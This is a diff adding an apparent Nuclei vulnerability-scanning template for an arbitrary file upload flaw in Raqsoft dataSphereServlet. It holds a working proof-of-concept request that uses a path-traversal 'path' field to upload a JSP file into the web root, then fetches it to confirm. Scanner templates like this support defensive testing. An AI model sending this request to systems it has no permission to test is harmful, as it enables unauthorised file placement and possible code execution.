@@ -1,0 +1,59 @@
+id: poc-yaml-raqsoft-datasphereservlet-anyfile-upload
+info:
+  name: Raqsoft dataSphereServlet Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alpha(4)}}"
+  t2: "{{base64(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/servlet/dataSphereServlet?action=38"
+    headers:
+      Content-Type: "multipart/form-data; boundary=eac629ee4641cb0fe10596fba5e0c5d9"
+    body: |
+      --eac629ee4641cb0fe10596fba5e0c5d9
+      Content-Disposition: form-data; name="openGrpxFile"; filename="{{t1}}.jsp"
+      Content-Type: text/plain
+
+      {{t2}}
+      --eac629ee4641cb0fe10596fba5e0c5d9
+      Content-Disposition: form-data; name="path"
+
+      ../../../
+      --eac629ee4641cb0fe10596fba5e0c5d9
+      Content-Disposition: form-data; name="saveServer"
+
+      1
+      --eac629ee4641cb0fe10596fba5e0c5d9--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "parent.openFileCallback"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
